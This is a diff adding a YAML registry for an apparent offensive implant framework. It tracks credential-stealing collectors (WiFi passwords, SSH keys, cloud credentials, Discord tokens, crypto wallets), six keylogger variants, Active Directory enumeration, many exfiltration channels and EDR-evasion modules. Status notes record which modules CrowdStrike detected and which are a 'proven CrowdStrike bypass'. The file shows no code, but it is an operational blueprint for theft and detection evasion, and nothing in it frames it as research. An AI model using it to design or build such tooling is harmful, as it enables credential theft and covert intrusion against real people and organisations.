@@ -1,0 +1,531 @@
+# Chunk Registry - Status and metadata for all framework chunks
+# status: enabled | disabled
+# tags: new (created within 7 days), burned (triggers EDR), session0 (fails in SSH)
+
+version: 1
+last_updated: "2026-07-21"
+
+chunks:
+  # ============================================================================
+  # COLLECTORS - Disabled/Burned
+  # ============================================================================
+  collectors/browser_chromium:
+    status: disabled
+    tags: [burned, behavioral]
+    created_at: "2026-07-03"
+    disabled_at: "2026-07-21"
+    burn_reason: "CrowdStrike behavioral detection on Chromium DB access (Login Data, Cookies)"
+
+  collectors/screenshot:
+    status: disabled
+    tags: [burned, session0]
+    created_at: "2026-07-03"
+    disabled_at: "2026-07-21"
+    burn_reason: "GDI capture fails in Session 0 (SSH). Requires interactive desktop via RDP or schtasks /IT"
+
+  collectors/screenshot_v2:
+    status: disabled
+    tags: [burned, session0]
+    created_at: "2026-07-03"
+    disabled_at: "2026-07-21"
+    burn_reason: "Same as screenshot - GDI requires interactive session"
+
+  # ============================================================================
+  # COLLECTORS - Enabled (CrowdStrike validated)
+  # ============================================================================
+  collectors/system_info_api:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    last_validated: "2026-07-21"
+
+  collectors/processes_api:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    last_validated: "2026-07-21"
+
+  collectors/installed_software:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    last_validated: "2026-07-21"
+
+  collectors/env_vars:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    last_validated: "2026-07-21"
+
+  collectors/clipboard:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    last_validated: "2026-07-21"
+
+  collectors/wifi_passwords:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    last_validated: "2026-07-21"
+
+  collectors/discord_tokens:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    last_validated: "2026-07-21"
+
+  collectors/ssh_keys:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    last_validated: "2026-07-21"
+
+  collectors/cloud_creds:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    last_validated: "2026-07-21"
+
+  collectors/drives:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    last_validated: "2026-07-21"
+
+  collectors/recent_files:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    last_validated: "2026-07-21"
+
+  collectors/startup_items:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    last_validated: "2026-07-21"
+
+  collectors/security_products:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    last_validated: "2026-07-21"
+
+  # ============================================================================
+  # COLLECTORS - Not yet validated (enabled by default)
+  # ============================================================================
+  collectors/system_info:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  collectors/processes:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  collectors/processes_lolbin:
+    status: enabled
+    tags: []
+    created_at: "2026-07-04"
+
+  collectors/active_windows:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  collectors/active_windows_lolbin:
+    status: enabled
+    tags: []
+    created_at: "2026-07-04"
+
+  collectors/clipboard_lolbin:
+    status: enabled
+    tags: []
+    created_at: "2026-07-04"
+
+  collectors/env_vars_lolbin:
+    status: enabled
+    tags: []
+    created_at: "2026-07-04"
+
+  collectors/crypto_wallets:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  collectors/ftp_credentials:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  collectors/telegram_session:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  collectors/netinfo_api:
+    status: enabled
+    tags: []
+    created_at: "2026-07-04"
+
+  collectors/netinfo_lolbin:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  collectors/scheduled_tasks_recon:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  collectors/system_info_registry:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  collectors/system_info_stealth:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  # Keylogger variants
+  collectors/keylogger:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  collectors/keylogger_poll:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  collectors/keylogger_clipboard:
+    status: enabled
+    tags: []
+    created_at: "2026-07-09"
+
+  collectors/keylogger_directinput:
+    status: enabled
+    tags: []
+    created_at: "2026-07-09"
+
+  collectors/keylogger_rawinput:
+    status: enabled
+    tags: []
+    created_at: "2026-07-09"
+
+  collectors/keylogger_uiautomation:
+    status: enabled
+    tags: []
+    created_at: "2026-07-09"
+
+  # AD collectors in collectors/ directory (legacy)
+  collectors/ad_computers:
+    status: enabled
+    tags: []
+    created_at: "2026-07-13"
+
+  collectors/ad_domain:
+    status: enabled
+    tags: []
+    created_at: "2026-07-13"
+
+  collectors/ad_gpos:
+    status: enabled
+    tags: []
+    created_at: "2026-07-13"
+
+  collectors/ad_groups:
+    status: enabled
+    tags: []
+    created_at: "2026-07-13"
+
+  collectors/ad_users:
+    status: enabled
+    tags: []
+    created_at: "2026-07-13"
+
+  # ============================================================================
+  # AD COLLECTORS - Full LDAP enumeration
+  # ============================================================================
+  ad_collectors/ad_users:
+    status: enabled
+    tags: []
+    created_at: "2026-07-07"
+
+  ad_collectors/ad_groups:
+    status: enabled
+    tags: []
+    created_at: "2026-07-07"
+
+  ad_collectors/ad_computers:
+    status: enabled
+    tags: []
+    created_at: "2026-07-07"
+
+  ad_collectors/ad_domains:
+    status: enabled
+    tags: []
+    created_at: "2026-07-07"
+
+  ad_collectors/ad_ous:
+    status: enabled
+    tags: []
+    created_at: "2026-07-07"
+
+  ad_collectors/ad_gpos:
+    status: enabled
+    tags: []
+    created_at: "2026-07-07"
+
+  # ============================================================================
+  # EXFIL - Dynamic (CrowdStrike validated)
+  # ============================================================================
+  exfil/tcp_dynamic:
+    status: enabled
+    tags: []
+    created_at: "2026-07-20"
+    last_validated: "2026-07-21"
+    note: "Dynamic ws2_32.dll loading bypasses CrowdStrike static analysis"
+
+  exfil/dns_dynamic:
+    status: enabled
+    tags: []
+    created_at: "2026-07-20"
+    note: "Dynamic dnsapi.dll loading"
+
+  exfil/winhttp_dynamic:
+    status: enabled
+    tags: []
+    created_at: "2026-07-20"
+    note: "Dynamic winhttp.dll loading"
+
+  exfil/https_dynamic:
+    status: enabled
+    tags: []
+    created_at: "2026-07-20"
+    note: "Dynamic winhttp.dll with TLS and cert error handling"
+
+  exfil/icmp_dynamic:
+    status: enabled
+    tags: []
+    created_at: "2026-07-20"
+    note: "Dynamic iphlpapi.dll/icmp.dll loading"
+
+  exfil/smb_dynamic:
+    status: enabled
+    tags: []
+    created_at: "2026-07-20"
+    note: "Dynamic mpr.dll loading"
+
+  # ============================================================================
+  # EXFIL - Static imports (may trigger CrowdStrike)
+  # ============================================================================
+  exfil/tcp_direct:
+    status: enabled
+    tags: [static_imports]
+    created_at: "2026-07-03"
+    note: "Static ws2_32 imports - may trigger CrowdStrike on fresh hash"
+
+  exfil/tcp_direct_v2:
+    status: enabled
+    tags: [static_imports]
+    created_at: "2026-07-03"
+
+  exfil/tcp_flush:
+    status: enabled
+    tags: [static_imports]
+    created_at: "2026-07-03"
+
+  exfil/http_post:
+    status: enabled
+    tags: [static_imports]
+    created_at: "2026-07-03"
+
+  exfil/https_post:
+    status: enabled
+    tags: [static_imports]
+    created_at: "2026-07-03"
+
+  exfil/dns_exfil:
+    status: enabled
+    tags: [static_imports]
+    created_at: "2026-07-03"
+
+  exfil/dns_txt:
+    status: enabled
+    tags: [static_imports]
+    created_at: "2026-07-03"
+
+  exfil/dns_flush:
+    status: enabled
+    tags: [static_imports]
+    created_at: "2026-07-03"
+
+  exfil/winhttp_api:
+    status: enabled
+    tags: [static_imports]
+    created_at: "2026-07-03"
+
+  exfil/winhttp_get:
+    status: enabled
+    tags: [static_imports]
+    created_at: "2026-07-03"
+
+  exfil/http_get_chunks:
+    status: enabled
+    tags: [static_imports]
+    created_at: "2026-07-03"
+
+  exfil/smb_write:
+    status: enabled
+    tags: [static_imports]
+    created_at: "2026-07-03"
+
+  exfil/named_pipe:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  exfil/email_mapi:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  exfil/paste_site:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  exfil/cloud_onedrive:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  # LOLBin exfil
+  exfil/bitsadmin_lolbin:
+    status: enabled
+    tags: [lolbin]
+    created_at: "2026-07-04"
+
+  exfil/certutil_lolbin:
+    status: enabled
+    tags: [lolbin]
+    created_at: "2026-07-04"
+
+  exfil/curl_lolbin:
+    status: enabled
+    tags: [lolbin]
+    created_at: "2026-07-04"
+
+  exfil/powershell_lolbin:
+    status: enabled
+    tags: [lolbin]
+    created_at: "2026-07-04"
+
+  exfil/mshta_lolbin:
+    status: enabled
+    tags: [lolbin]
+    created_at: "2026-07-04"
+
+  exfil/cscript_lolbin:
+    status: enabled
+    tags: [lolbin]
+    created_at: "2026-07-04"
+
+  # ============================================================================
+  # EVASION - All enabled by default
+  # ============================================================================
+  evasion/iat_pad:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+    note: "IAT padding with benign DLLs - proven CrowdStrike bypass"
+
+  evasion/behavioral_pacing:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  evasion/sleep_jitter:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  evasion/anti_debug:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  evasion/anti_sandbox:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  evasion/anti_vm:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  evasion/etw_patch:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  evasion/stack_strings:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  evasion/indirect_syscall:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  evasion/unhook_ntdll:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  # Note: Many more evasion chunks exist - add as needed
+  # Full list: aes_encrypt, amsi_hwbp, anti_debug_*, anti_sandbox_*,
+  # api_hash, atom_bombing, cascade_inject, cf_flatten, checksum_spoof,
+  # code_cave, debug_dir_strip, deferred_exec, dll_notif_callback,
+  # elastic_gadget, entropy_pad, env_key_*, etw_*, fiber_exec, guard_pages,
+  # halos_gate, header_stomp, hells_gate, herpaderp, hw_bp_etw,
+  # instrumentation_callback, manual_syscall_stub, module_overload,
+  # module_stomp, net_*, ntmap_inject, opaque_predicates, phantom_dll,
+  # process_doppelgang, process_masquerade, propagate_inject, recycled_gate,
+  # resource_spoof, ret_spoof, rich_header, section_merge, seh_control_flow,
+  # self_delete*, sleep_*, stack_spoof*, syscall_*, syswhispers3, tartarus_gate,
+  # thread_*, timestomp, tp_work_exec, triggered_exec, txf_phantom, uac_*,
+  # unhook_*, veh_*, wnf_callback
+
+  # ============================================================================
+  # CORE
+  # ============================================================================
+  core/emit_buffer:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  core/file_ops:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  core/run_cmd:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  core/stage_ads:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
+
+  core/stage_registry:
+    status: enabled
+    tags: []
+    created_at: "2026-07-03"
